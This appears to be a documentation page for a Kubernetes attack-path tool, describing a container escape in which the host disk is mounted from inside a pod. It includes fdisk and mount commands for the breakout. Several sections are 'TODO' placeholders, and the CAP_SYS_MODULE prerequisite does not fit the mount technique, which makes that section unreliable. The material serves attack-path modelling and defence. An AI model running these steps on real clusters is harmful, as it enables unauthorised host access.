# CE_PRIV_MOUNT

Mount the host disk and gain access to the host via arbitrary filesystem write

| Source                                    | Destination                           | MITRE                            |
| ----------------------------------------- | ------------------------------------- |----------------------------------|
| [Container](../vertices/CONTAINER.md) | [Node](../vertices/NODE.md) | [Escape to Host, T1611](https://attack.mitre.org/techniques/T1611/) |

## Details

TODO TODO

## Prerequisites

Execution within a container process with the `CAP_SYS_MODULE` capability enabled.

See the [example pod spec](../../test/setup/test-cluster/attacks/CE_PRIV_MOUNT.yaml).

## Checks

From within a running container, determine whether it is running with `CAP_SYS_MODULE`:

```bash
# Check the current process' capabilities
cat /proc/self/status | grep CapEff
# CapEff:	00000000a80425fb

# Decode the capabilities (on current box or offline) and check for CAP_SYS_MODULE
# NOTE: can install capsh via apt-get update && apt-get install libcap2-bin
capsh --decode=00000000a80425fb | grep cap_sys_module
```

## Exploitation

Find the disks visible to our container process:

```bash
apt update && apt install fdisk
fdisk -l 
# -> /dev/vda1
```
Mount the disks into the container:

```bash
mkdir -p /mnt/hostfs
mount /dev/vda1 /mnt/hostfs
ls -lah /mnt/hostfs/
```

Now TODO TODO

## OPSEC Considerations

TODO TODO

## Defences

+ Implement least privilege
 +Avoid running privileged pods.

## Monitoring

TODO TODO

## Calculation

[EscapePrivMount](../../pkg/kubehound/graph/edge/escape_priv_mount.go)

## References:

+ [HackTricks Docker Breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)

